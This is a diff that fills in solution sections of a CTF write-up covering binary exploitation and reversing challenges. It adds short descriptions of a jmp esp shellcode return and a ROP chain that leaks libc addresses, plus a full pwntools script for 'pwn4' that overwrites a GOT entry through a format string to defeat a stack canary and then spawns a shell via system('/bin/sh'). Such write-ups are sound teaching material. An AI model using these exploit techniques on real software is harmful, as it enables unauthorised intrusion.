@@ -652,7 +652,7 @@ cat flag.txt
 
 **Solution**
 
-(TODO)
+Rewrite the return address to `jmp esp`, so we can execute our shellcode on the stack just after the return address.
 
 ## 300 Pwn / pwn3 ##
 
@@ -670,7 +670,9 @@ cat flag.txt
 
 **Solution**
 
-(TODO)
+ROP to call `puts(&puts@got)` and `pop xxx; ret` to leak address in GOT table and return to main for second exploitation.
+We can find that the `libc` being used is `2.19` by searching low 12 bits of remote `puts` function in `libc-database`.
+Then call `System("/bin/sh")` to get shell.
 
 ## 300 Pwn / pwn4 ##
 
@@ -688,7 +690,60 @@ cat flag.txt
 
 **Solution**
 
-(TODO)
+Almost same as `pwn3` except it has a canary protection and a format string vulnerability. Use that format string to rewrite GOT table entry of `__stack_chk_fail` to `retn` so it will not abort but will return immediately.
+```python
+from pwn import *
+import struct
+g_local=1
+context.log_level='debug'
+if g_local:
+	sh = process('./pwn2')
+	gdb.attach(sh)
+else:
+	e = ELF("libc-2.19.so")
+	sh = remote("104.154.106.182", 3456)
+
+def hn(pos, val):
+	assert val < 0x10000
+	if val == 0:
+		return "%" + str(pos) + "$hn"
+	else:
+		return "%" + str(val) + "c%" + str(pos) + "$hn"
+
+def cont_shoot(poses, vals):
+	assert len(poses) == len(vals)
+	size = len(poses)
+	ret = ""
+	i = 0
+	cur_size = 0
+	next_overflow = 0
+	while i < size:
+		assert next_overflow >= cur_size
+		num = next_overflow - cur_size + vals[i]
+		if num < 0x10000:
+			ret += hn(poses[i], num)
+			next_overflow += 0x10000
+		else:
+			num = vals[i] - (cur_size - (next_overflow - 0x10000))
+			assert num >= 0
+			ret += hn(poses[i], num)
+		cur_size += num
+		i += 1
+	return ret
+
+sh.recvuntil(" the new?\n")
+sh.sendline((cont_shoot([15], [0x85E4]).ljust(0x20, '\x00') + p32(0x8049904)).ljust(0x90, 'A') \
+ + p32(0x80483F0) + p32(0x080483a1) + p32(0x8049908) + p32(0x8048551))
+leak = sh.recvuntil('\n')
+libc_addr = u32(leak[:4]) - e.symbols["puts"] #0x5fca0
+print hex(libc_addr)
+
+sh.recvuntil(" the new?\n")
+sh.sendline('A' * 0x90 + p32(libc_addr + e.symbols["system"]) + p32(0) + \
+	p32(libc_addr + next(e.search("/bin/sh\x00"))))
+
+sh.interactive()
+```
 
 ## 75 Reversing / crackme01 ##
 
@@ -1013,7 +1068,7 @@ you earned it
 
 **Solution**
 
-(TODO)
+Patch the `call ptrace` and `call signal` that are used as anti-debug techniques to `NOPs`, then set breakpoint at `0x1078`, inspect the second argument to read the flag.
 
 ## 25 Steganography / yhpargonagets ##
 
